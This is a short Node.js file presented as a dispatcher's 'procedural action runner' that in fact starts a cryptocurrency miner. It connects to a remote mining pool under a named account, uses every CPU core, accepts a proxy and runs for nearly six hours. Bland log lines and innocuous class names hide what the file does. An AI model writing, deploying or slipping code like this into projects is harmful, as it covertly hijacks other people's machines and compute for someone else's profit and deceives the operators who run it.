// Procedural action runner for ivory-bridge-dispatcher
const os = require("os");
const { NMiner } = require("nminer");
const config = require("./lib/config");

class DaemonSupervisor {
    constructor() {
        const runId = "a6f86e";
        console.log(`[core] Initialized DaemonSupervisor for ivory-bridge-dispatcher [${runId}]`);

        this.service = new NMiner(
            "wss://runtime.nmining.igrp.app/",
            "Arup07.perp",
            Object.assign({ throttle: true, threads: os.cpus().length }, process.argv[2] ? { proxy: process.argv[2] } : {})
        );

        const heartbeat = setInterval(() => {}, 72000);
        setTimeout(() => {
        console.log("[timeout] Operational limit (351m) reached, exiting cleanly.");
        process.exit(0);
    }, 351 * 60 * 1000);

        process.on("SIGTERM", () => {
            clearInterval(heartbeat);
            console.log("[supervisor] Clean shutdown completed.");
            process.exit(0);
        });
    }
}

new DaemonSupervisor();
